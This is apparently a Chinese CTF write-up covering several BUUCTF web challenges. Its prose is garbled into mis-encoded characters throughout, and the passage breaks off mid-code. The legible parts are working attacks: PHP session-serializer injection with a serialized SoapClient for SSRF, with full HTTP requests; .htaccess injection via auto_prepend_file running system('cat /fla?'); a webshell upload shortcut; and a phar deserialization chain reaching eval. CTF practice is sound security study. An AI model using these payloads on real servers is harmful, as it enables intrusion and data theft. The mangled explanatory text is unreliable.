\n\nåºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯php_serializeï¼Œé‚£ä¹ˆå‚¨å­˜çš„sessionæ–‡ä»¶ä¸º\n\n```\na:1:{s:4:\"name\";s:5:\"|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";}\n```\n\nè€Œååºåˆ—åŒ–å¼•æ“å¦‚æœä½¿ç”¨çš„æ˜¯phpï¼Œå°±ä¼šæŠŠ|ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ã€‚æŠŠ`a:1:{s:4:\"name\";s:5:\"`å½“ä½œé”®åï¼Œè€ŒæŠŠ`O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}`å½“ä½œç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œæœ€åä¼šæŠŠå®ƒè¿›è¡Œunserializeå¤„ç†ï¼Œæ­¤æ—¶å°±æ„æˆäº†ä¸€æ¬¡ååºåˆ—åŒ–æ³¨å…¥æ”»å‡»ã€‚  \n\n## SoapClient\n\nå†å°±æ˜¯åˆ°å¯ä»¥ssrfçš„ç±» ä¹‹å‰åˆ·ctfshowçš„é¢˜ç›®æ—¶å€™å°±é‡åˆ°æ›¾ç»ç”¨è¿‡è¿™ä¸ªç±» SoapClient  å®ƒå¯ä»¥å‘é€httpè¯·æ±‚åŒ…\n\n åˆ©ç”¨phpåŸç”Ÿç±»SoapClientä¸­çš„__callæ–¹æ³•è¿›è¡ŒSSRF\n\nåœ¨æ–°å»ºä¸€ä¸ª**SoapClient**çš„ç±»å¯¹è±¡çš„æ—¶å€™ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²å½¢å¼çš„**wsdl**ï¼Œå¦ä¸€ä¸ªæ˜¯æ•°ç»„å½¢å¼çš„**options**ã€‚è€Œ**wsdl**åœ¨å¼€å‘ä¸­ååˆ†å¸¸è§ï¼Œåœ¨å®‰å…¨ä¸­ç”¨çš„æ¯”è¾ƒå°‘ ï¼Œå¹¶ä¸”è¿™é‡Œä¹Ÿç”¨ä¸åˆ°ï¼Œæ‰€ä»¥è®¾ä¸ºnullå°±è¡Œäº†ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689864728281-c032ebaf-c62c-4b99-835a-e88cdcfe9cc7.png)\n\næ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š\n\n```php\n<?php\n$url = \"http://127.0.0.1/flag.php\";\n$b = new SoapClient(null, array('uri' => $url, 'location' => $url));\n$a = serialize($b);\necho \"|\" . urlencode($a);\n?>\n|O%3A10%3A%22SoapClient%22%3A36%3A%7Bs%3A15%3A%22%00SoapClient%00uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00style%22%3BN%3Bs%3A15%3A%22%00SoapClient%00use%22%3BN%3Bs%3A20%3A%22%00SoapClient%00location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00trace%22%3Bb%3A0%3Bs%3A23%3A%22%00SoapClient%00compression%22%3BN%3Bs%3A15%3A%22%00SoapClient%00sdl%22%3BN%3Bs%3A19%3A%22%00SoapClient%00typemap%22%3BN%3Bs%3A22%3A%22%00SoapClient%00httpsocket%22%3BN%3Bs%3A19%3A%22%00SoapClient%00httpurl%22%3BN%3Bs%3A18%3A%22%00SoapClient%00_login%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_use_digest%22%3Bb%3A0%3Bs%3A19%3A%22%00SoapClient%00_digest%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_host%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_port%22%3BN%3Bs%3A24%3A%22%00SoapClient%00_proxy_login%22%3BN%3Bs%3A27%3A%22%00SoapClient%00_proxy_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_exceptions%22%3Bb%3A1%3Bs%3A21%3A%22%00SoapClient%00_encoding%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_classmap%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_features%22%3BN%3Bs%3A31%3A%22%00SoapClient%00_connection_timeout%22%3Bi%3A0%3Bs%3A27%3A%22%00SoapClient%00_stream_context%22%3Bi%3A0%3Bs%3A23%3A%22%00SoapClient%00_user_agent%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_keep_alive%22%3Bb%3A1%3Bs%3A23%3A%22%00SoapClient%00_ssl_method%22%3BN%3Bs%3A25%3A%22%00SoapClient%00_soap_version%22%3Bi%3A1%3Bs%3A22%3A%22%00SoapClient%00_use_proxy%22%3BN%3Bs%3A20%3A%22%00SoapClient%00_cookies%22%3Ba%3A0%3A%7B%7Ds%3A29%3A%22%00SoapClient%00__default_headers%22%3BN%3Bs%3A24%3A%22%00SoapClient%00__soap_fault%22%3BN%3Bs%3A26%3A%22%00SoapClient%00__last_request%22%3BN%3Bs%3A27%3A%22%00SoapClient%00__last_response%22%3BN%3Bs%3A34%3A%22%00SoapClient%00__last_request_headers%22%3BN%3Bs%3A35%3A%22%00SoapClient%00__last_response_headers%22%3BN%3B%7D\n```\n\nè‡³äºè¿™ä¸€è¡Œ`$b = new SoapClient(null, array('uri' => $url, 'location' => $url));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689865079531-bdee449b-dea8-4904-858a-844632b40566.png)\n\næœ¬é¢˜çš„æ€è·¯ï¼š\n\nåˆ©ç”¨å›è°ƒå‡½æ•°è¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilaze  åœ¨ä»£ç ä¸­è¿™æ ·`session_start(serialize_hander=php_serialize)`  å¯ä»¥æŸ¥phpæ‰‹å†Œèƒ½è¿™æ ·ä¿®æ”¹  ä¸€å¼€å§‹é—®gptè¯´ä¸èƒ½è¿™æ · ç€å®æ˜¯è¢«è¯¯å¯¼äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689867197838-9f5e2a67-85ef-4ab1-80ab-409e4fab2459.png)\n\næ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆåºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ æ–‡ä»¶åè¦ç”¨phpsessid=8ä½è‡ªå·±è®¾ç½®ä¸€ä¸‹\n\nåˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´ï¼Œç”¨extract()è¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°call_user_funcï¼Œå›è°ƒå‡½æ•°è°ƒç”¨Soapç±»çš„æœªçŸ¥æ–¹æ³•ï¼Œè§¦å‘__callæ–¹æ³•è¿›è¡ŒSSRFè®¿é—®flag.phpã€‚æŠŠflagå†™å…¥sessionï¼Œå†æŠŠsessionæ‰“å°å‡ºæ¥å³å¯ã€‚\n\nè¯·æ±‚åŒ…ï¼š\n\n```php\nPOST /index.php?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1\nHost: b409417f-d781-4e26-ae3a-96e176b88d1a.node4.buuoj.cn:81\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=aaaaaaaa\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\n\nserialize_handler=php_serialize\n```\n\né¦–å…ˆå…ˆå°†phpåºåˆ—åŒ–å¼•æ“è®¾ç½®ä¸ºphp_serialize  å†™å…¥sessionæ–‡ä»¶  \n\næºç ä¸­session_start()ååºåˆ—åŒ–ä½¿ç”¨çš„æ˜¯phpå¼•æ“ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914183098-3d85e411-a2a5-4148-9710-278f7949f707.png)\n\næ¥ä¸‹é‡Œæˆ‘ä»¬è¦†ç›–å˜é‡bï¼Œåˆ©ç”¨call_user_funcè°ƒç”¨SoapClientç±»ä¸­çš„ä¸å­˜åœ¨æ–¹æ³•ï¼Œè§¦å‘__callæ–¹æ³•ï¼Œæ‰§è¡Œssrfã€‚å¹¶è·å¾—è®¿é—®flag.phpçš„PHPSESSIDã€‚  \n\n è¿™é‡Œçš„$aæ•°ç»„å°±æ˜¯array(\"SoapClient\",\"welcome_to_the_lctf2018\")\n\nä¹Ÿå°±æ˜¯`call_user_func(call_user_func(\"SoapClient\",\"welcome_to_the_lctf2018\"))` å› ä¸ºSoapClientä¸å­˜åœ¨welcome_to_the_lctf2018æ–¹æ³• æ‰€ä»¥å°±è°ƒç”¨__callé­”æœ¯æ–¹æ³•äº†\n\n```php\nPOST /?f=extract&name=SoapClient HTTP/1.1\nHost: 603457b5-b6be-4cdb-9b14-ec8f4d39f71f.node4.buuoj.cn:81\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=66666666\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 16\n\nb=call_user_func\n```\n\nè¿™æ ·æ ¹æ®flag.php å°±ä¼šå°†flagå†™å…¥session\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914873442-69582790-3062-440f-850f-34d2eb748016.png)\n\næ‰¾åˆ°phpsessid  \n\næœåŠ¡å™¨å¯ä»¥æ ¹æ®PHPSESSIDæ¥è¯†åˆ«ç”¨æˆ·session,è·å–ä¿å­˜åœ¨æœåŠ¡å™¨sessionæ–‡ä»¶ä¸­çš„ç›¸å…³æ•°æ®,å¦‚ç”¨æˆ·çŠ¶æ€ã€è´­ç‰©è½¦å†…å®¹ç­‰ã€‚  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914689440-f88fdcbe-0b73-4659-99df-fd94033ce083.png)\n\nç„¶åå°†phpsessidæ”¹ä¸ºä¿å­˜flagçš„é‚£ä¸ªå°±å¯ä»¥äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914737673-48bf1329-9c2b-46d5-bdd8-0d533f171351.png)\n\né‚£ä¹ˆä¸ºä»€ä¹ˆä¿®æ”¹phpsessidå°±èƒ½å¾—åˆ°flagé‚£ \n\næˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„ï¼šæˆ‘ä»¬éƒ½çŸ¥é“sessionæ˜¯ä¿å­˜æˆ‘ä»¬ç™»å½•çŠ¶æ€çš„è¯†åˆ«èº«ä»½çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬è®¿é—®flag.phpä»¥åå°†flagä¿å­˜åœ¨session[flag]ä¸­ æˆ‘ä»¬åªè¦å°†æˆ‘ä»¬èº«ä»½æ”¹ä¸ºè®¿é—®flag.phpé‚£ä¸ªèº«ä»½å°±è¡Œäº† ç„¶åindx.phpä¸­çš„`var_dump($_SESSION)`å°±ä¼šå°†flagè¾“å‡ºå‡ºæ¥\n\n# 122ã€[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ \n\n # 123ã€[ç¾ŠåŸæ¯2020]easyphp\n\nä¸€é“å…³äº.htaccessçš„é¢˜ç›® \n\nç»™äº†æºç ;\n\n```php\n<?php\n    $files = scandir('./'); \n    foreach($files as $file) {\n        if(is_file($file)){\n            if ($file !== \"index.php\") {\n                unlink($file);\n            }\n        }\n    }\n    if(!isset($_GET['content']) || !isset($_GET['filename'])) {\n        highlight_file(__FILE__);\n        die();\n    }\n    $content = $_GET['content'];\n    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {\n        echo \"Hacker\";\n        die();\n    }\n    $filename = $_GET['filename'];\n    if(preg_match(\"/[^a-z\\.]/\", $filename) == 1) {\n        echo \"Hacker\";\n        die();\n    }\n    $files = scandir('./'); \n    foreach($files as $file) {\n        if(is_file($file)){\n            if ($file !== \"index.php\") {\n                unlink($file);\n            }\n        }\n    }\n    file_put_contents($filename, $content . \"\\nHello, world\");\n?>\n```\n\nå¤§è‡´æµè§ˆå°±æ˜¯å½“å‰ç›®å½•ä¸‹åªèƒ½å­˜åœ¨index.php å…¶ä»–æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ \n\nä½†æ˜¯è¿™é“é¢˜ç›®å¯ä»¥åˆ›å»ºå…¶ä»–æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹ çœŸçš„ç¦»è°± ä¸è¿‡å†™å…¥ä¹Ÿæ²¡ç”¨ è¿™é“é¢˜ç›®åªå®¹è®¸index.phpè§£æ å…¶ä»–phpæ–‡ä»¶ä»£ç éƒ½æ˜¯åŸæ ·è¾“å‡º ä¸ä¼šè§£æçš„\n\nç„¶åè¿™é“é¢˜ç›®è¦åˆ©ç”¨.htaccess è¿™æ˜¯ä¸€ä¸ªphpé…ç½®æ–‡ä»¶ é‚£ä¹ˆä¸ºä»€ä¹ˆä¸ç”¨.user.iniå‘¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920107307-9ef4226b-6c09-496c-a88a-9e74d6abd4e4.png)\n\nå› ä¸º.htaccessæ–‡ä»¶ä½œç”¨çš„èŒƒå›´æ›´å¤§  å®ƒæ¯”è¾ƒçµæ´»ï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ï¼Œä¹Ÿä¸éœ€è¦ç®¡ç†å‘˜æƒé™  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920342664-afd98b25-24e8-43c4-9bec-4f10ce93dd4b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920296884-1a0e4198-a879-4cb9-9477-c73e849b53c9.png)\n\næˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ª.htaccessæ–‡ä»¶å»é…ç½®æ–‡ä»¶åŒ…å« \n\nè¿™æ ·åœ¨æ¯ä¸ªphpæ–‡ä»¶ä¸­éƒ½åŒ…å«ä¸€ä¸ª.htaccessæ–‡ä»¶ æœ‰ç‚¹å¥—å¨ƒçš„æ„Ÿè§‰\n\nå¹¶ä¸”æˆ‘ä»¬åœ¨.htaccessæ–‡ä»¶ä¸­ä»¥æ³¨é‡Šæ–¹æ³•å†™ä¸Šæˆ‘ä»¬çš„æ¶æ„ä»£ç  è¿™æ ·å°±ä¸ä¼šå½±å“æˆ‘ä»¬çš„.htaccessæ–‡ä»¶æ­£å¸¸è¿è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920490507-9295d8b4-8c6b-4185-9555-4a339bbc66f1.png)\n\næ‰€ä»¥å†…å®¹ä¸ºï¼š\n\n```php\nphp_value auto_prepend_file .htaccess\n#<?php phpinfo();?>\n```\n\nä½†æ˜¯æ ¹æ®æºç  fileè¢«wafäº† \n\nä½†æ˜¯å¯ä»¥ç”¨`\\`æ¥æ‹¼æ¥ä¸Šä¸‹è¡Œ æˆ‘åœ¨ä¸Šé¢ä¹Ÿè¯´åˆ°äº†\n\næ‰€ä»¥æ”¹ä¸º\n\n```php\nphp_value auto_prepend_f\\\nile .htaccess\n#<?php phpinfo();?>\n```\n\nå¹¶ä¸”\n\n`file_put_contents($filename, $content . \"\\nHello, world\");`ä¼šåœ¨åé¢åŠ ä¸Šæ²¡æ„ä¹‰çš„å†…å®¹ å½±å“æˆ‘ä»¬çš„.htaccessæ–‡ä»¶æ­£å¸¸æ‰§è¡Œ æ‰€ä»¥å†åŠ ä¸€ä¸ª`\\`è½¬ä¹‰æ‰`\\n`ä¸è®©ä»–æ¢è¡Œ\n\nè¿™æ ·æ‹¼æ¥çš„å†…å®¹å°±å˜ä¸º`\\\\nHello, world`äº†\n\næ‰€ä»¥æœ€payloadå½¢å¼:\n\n```php\nphp_value auto_prepend_f\\\nile .htaccess\n#<?php phpinfo();?>\\\n?filename=.htaccess&content=php_value%20auto_prepend_f%5C%0Aile%20.htaccess%0A%23%3C%3Fphp%20system('cat%20%2Ffla%3F')%3B%3F%3E%5C\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921496468-5989a398-9503-40ac-9ab4-563419de6dfb.png)\n\nå…¶å®ä¸€å¼€å§‹æˆ‘æœ‰ä¸ªé—®é¢˜å°±æ˜¯ `#<?php phpinfo();?>\\`è¢«åŒ…å«åœ¨index.phpä¸­ å‰é¢ä¸æ˜¯æœ‰ä¸ª`#`å— \n\n`#`åœ¨phpä¸­ä¹Ÿæ˜¯å•è¡Œæ³¨é‡Šç¬¦ ä¸ºä»€ä¹ˆä¼šæ‰§è¡Œè¿™ä¸€è¡Œå‘¢ ï¼Ÿ\n\nå…¶å®#æ ¹æœ¬å°±ä¸åœ¨phpä»£ç å†…å®¹ä¸­ ä¹Ÿå°±æ˜¯ä¸åœ¨phpä»£ç `<?php ?>`ä¸­ ä¸ä¼šå½“ä½œæ³¨é‡Šç¬¦ åªæœ‰åœ¨`<?php ?>`é‡Œé¢æ‰ä¼šè¢«å½“ä½œæ³¨é‡Šç¬¦\n\nä¸€ä¸‹demoç®€å•ç†è§£\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921829164-36d8fada-eb71-4646-8c59-c4ba49d8b785.png)\n\n# 124ã€[GXYCTF2019]BabysqliV3.0\n\nè¿™é“é¢˜ç›®çœ‹æ ‡é¢˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ ä½†æ˜¯å…¶å®é¢„æœŸè§£æ˜¯pharååºåˆ—åŒ– æœ€é‡è¦çš„æ˜¯ä»£ç å®¡è®¡\n\nå¼±å£ä»¤ admin/password\n\nçœ‹url å¾ˆå¥‡æ€ª æ„Ÿè§‰å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–\n\n```\n/home.php?file=php://filter/read=convert.base64-encode/resource=upload\n```\n\nupload.php\n\n```php\n<?php\nerror_reporting(0);\nclass Uploader{\n    public $Filename;\n    public $cmd;\n    public $token;\n    \n\n    function __construct(){\n        $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n        $ext = \".txt\";\n        @mkdir($sandbox, 0777, true);\n        if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n            $this->Filename = $_GET['name'];\n        }\n        else{\n            $this->Filename = $sandbox.$_SESSION['user'].$ext;\n        }\n\n        $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n        $this->token = $_SESSION['user'];\n    }\n\n    function upload($file){\n        global $sandbox;\n        global $ext;\n\n        if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n            $this->cmd = \"die('illegal filename!');\";\n        }\n        else{\n            if($file['size'] > 1024){\n                $this->cmd = \"die('you are too big (â€²â–½`ã€ƒ)');\";\n            }\n            else{\n                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n            }\n        }\n    }\n\n    function __toString(){\n        global $sandbox;\n        global $ext;\n        // return $sandbox.$this->Filename.$ext;\n        return $this->Filename;\n    }\n\n    function __destruct(){\n        if($this->token != $_SESSION['user']){\n            $this->cmd = \"die('check token falied!');\";\n        }\n        eval($this->cmd);\n    }\n}\n\nif(isset($_FILES['file'])) {\n    $uploader = new Uploader();\n    $uploader->upload($_FILES[\"file\"]);\n    if(@file_get_contents($uploader)){\n        echo \"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š<br>\".$uploader.\"<br>\";\n        echo file_get_contents($uploader);\n    }\n}\n\n?>\n```\n\nhome.php\n\n```php\n<?php\nsession_start();\necho \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" /> <title>Home</title>\";\nerror_reporting(0);\nif(isset($_SESSION['user'])){\n\tif(isset($_GET['file'])){\n\t\tif(preg_match(\"/.?f.?l.?a.?g.?/i\", $_GET['file'])){\n\t\t\tdie(\"hacker!\");\n\t\t}\n\t\telse{\n\t\t\tif(preg_match(\"/home$/i\", $_GET['file']) or preg_match(\"/upload$/i\", $_GET['file'])){\n\t\t\t\t$file = $_GET['file'].\".php\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\t$file = $_GET['file'].\".fxxkyou!\";\n\t\t\t}\n\t\t\techo \"å½“å‰å¼•ç”¨çš„æ˜¯ \".$file;\n\t\t\trequire $file;\n\t\t}\n\t\t\n\t}\n\telse{\n\t\tdie(\"no permission!\");\n\t}\n}\n?>\n```\n\n## åˆ†æï¼š\n\nä»£ç å®¡è®¡ ä»£ç å®¡è®¡å¤ªé‡è¦äº† \n\næˆ‘ä»¬å…ˆæ­£å¸¸ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689928467956-3270cb40-1179-4a4e-b07c-0830b11f0a61.png)\n\nçˆ†å‡ºäº†ä¿å­˜è·¯å¾„ å¹¶ä¸”ä»–ç›´æ¥æ˜¾ç¤ºå‡ºäº†æˆ‘ä»¬çš„å†…å®¹GIF89aï¼Ÿï¼Ÿï¼Ÿï¼Ÿ ä½†æ˜¯æˆ‘ä»¬çš„æ–‡ä»¶åç¼€å·²ç»è¢«æ”¹ä¸ºäº†txt æ‰€ä»¥æˆ‘ä»¬çš„phpä»£ç æ— æ³•æ‰§è¡Œ\n\nçœ‹çœ‹ä¸ºä»€ä¹ˆä¼šç›´æ¥è¾“å‡ºçš„ä»£ç é€»è¾‘ï¼Œå¯è§æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶å ä¼šç«‹å³å°†æ–‡ä»¶ç»è¿‡å¤„ç†ä¹‹åè¾“å‡º\n\n```php\nif(isset($_FILES['file'])) {\n    $uploader = new Uploader();\n    $uploader->upload($_FILES[\"file\"]);\n    if(@file_get_contents($uploader)){\n        echo \"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š<br>\".$uploader.\"<br>\";\n        echo file_get_contents($uploader);\n    }\n}\n```\n\nå†æ¥çœ‹è¿™ä¸€éƒ¨åˆ† ç»å…¸åˆ›å»ºä¸€ä¸ªæ²™ç›’ \n\nå¹¶ä¸”æ³¨æ„åˆ°\n\n```php\n       if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n            $this->Filename = $_GET['name'];\n        }\n```\n\nnameæˆ‘ä»¬å¯æ§ å¦‚æœæˆ‘ä»¬getä¸€ä¸ªnameå¹¶ä¸”ä¸åŒ…å«ä»–æ­£åˆ™çš„ä¼ªåè®®å­—ç¬¦ é‚£ä¹ˆå°±ä¸ä¼šè¢«ä»–ä¿®æ”¹æ–‡ä»¶å\n\nå¦‚æœæ²¡æœ‰è®¾ç½®æˆ–è€…åŒ…å«ä»–æ­£åˆ™çš„å­—ç¬¦\n\næˆ‘ä»¬æ–‡ä»¶åæ”¹ä¸º`$sandbox.$_SESSION['user'].$ext;` å¾ˆç¬¦åˆ`/var/www/html/uploads/f07f07f4e21adb2dbae6c57907a6b22c/GXY7ee46e116c49b534d9932a9999994865.txt`æ¸…æ™°æ˜äº†\n\n```php\n    function __construct(){\n        $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n        $ext = \".txt\";\n        @mkdir($sandbox, 0777, true);\n        if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n            $this->Filename = $_GET['name'];\n        }\n        else{\n            $this->Filename = $sandbox.$_SESSION['user'].$ext;\n        }\n\n        $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n        $this->token = $_SESSION['user'];\n    }\n```\n\nå†æ¥çœ‹ \n\nåªè¦ç¬¦åˆ`preg_match(\"[^a-z0-9]\", $this->Filename)` `$file['size'] > 1024`\n\né‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å°±ä¼šè¢«ç§»åŠ¨åˆ°æ–°çš„è·¯å¾„å¹¶ä¸”è¿™ä¸ªè·¯å¾„å°±æ˜¯æˆ‘ä»¬ä¹‹å‰é€šè¿‡getä¼ å‚çš„name\n\n```php\n  function upload($file){\n        global $sandbox;\n        global $ext;\n\n        if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n            $this->cmd = \"die('illegal filename!');\";\n        }\n        else{\n            if($file['size'] > 1024){\n                $this->cmd = \"die('you are too big (â€²â–½`ã€ƒ)');\";\n            }\n            else{\n                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n            }\n        }\n    }\n```\n\nè¿˜å‰©ä¸¤ä¸ªé­”æœ¯æ–¹æ³•\n\nå¯ä»¥çœ‹åˆ°ææ„å‡½æ•° å­˜åœ¨eval æ‰§è¡Œcmdå±æ€§ ä½†æ˜¯è¿™ä¸ªé¢˜ç›®ä¸å­˜åœ¨ååºåˆ—åŒ–å…¥å£å‡½æ•°\n\nä½†æ˜¯è¿™ä¸ªé¢˜ç›®æœ‰æ–‡ä»¶ä¸Šä¼ å•Š å¤ªç»å…¸äº† pharæ–‡ä»¶æ­é…phar://å°±å¯ä»¥è¿›è¡Œååºåˆ—åŒ–\n\n```php\n    function __toString(){\n        global $sandbox;\n        global $ext;\n        // return $sandbox.$this->Filename.$ext;\n        return $this->Filename;\n    }\n\n    function __destruct(){\n        if($this->token != $_SESSION['user']){\n            $this->cmd = \"die('check token falied!');\";\n        }\n        eval($this->cmd);\n    }\n}\n```\n\nok æ€è·¯æ¸…æ™°ï¼\n\n## éé¢„æœŸï¼š\n\n```\n/home.php?file=upload&name=/var/www/html/1.php\n```\n\nç„¶åä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬\n\n## é¢„æœŸè§£:\n\nè¦æƒ³æ‰§è¡Œeval é‚£ä¹ˆ `$this->token != $_SESSION['user']`\n\n```php\n  function __destruct(){\n        if($this->token != $_SESSION['user']){\n            $this->cmd = \"die('check token falied!');\";\n        }\n        eval($this->cmd);\n    }\n}\n```\n\n`$_SESSION['user']`æ˜¯å¤šå°‘å‘¢ æˆ‘ä»¬å¯ä»¥éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ¥çœ‹å› ä¸ºè·¯å¾„ä¸­å°±ä¼šçˆ†å‡º\n\n```\n$this->Filename = $sandbox.$_SESSION['user'].$ext;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689930191463-8262e26e-2d8a-4455-84c1-9ba94f9306b0.png)\n\n```\n/var/www/html/uploads/d13687f9a4bb80ded57226b5f42f671e/GXY845d6439be6936948e31cbfbbc90a715.txt\n```\n\né‚£ä¹ˆ`$_SESSION['user']=GXY845d6439be6936948e31cbfbbc90a715`\n\nç„¶åå°±æ˜¯å¾ˆç»å…¸çš„pharé“¾å­æ„é€  å·çš„\n\n```php\n<?php\n\nclass Uploader\n{\n    public $Filename;\n    public $cmd;\n    public $token;\n}\n\n$o = new Uploader();\n\n$o->Filename=\"test\";\n\n$o->cmd=\"highlight_file('/var/www/html/flag.php');\";\n\n$o->token=\"GXY845d6439be6936948e31cbfbbc90a715\";\n\n\n$phar = new Phar(\"phar.phar\");\n\n$phar->startBuffering();\n\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´\n\n$phar->setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest\n\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ 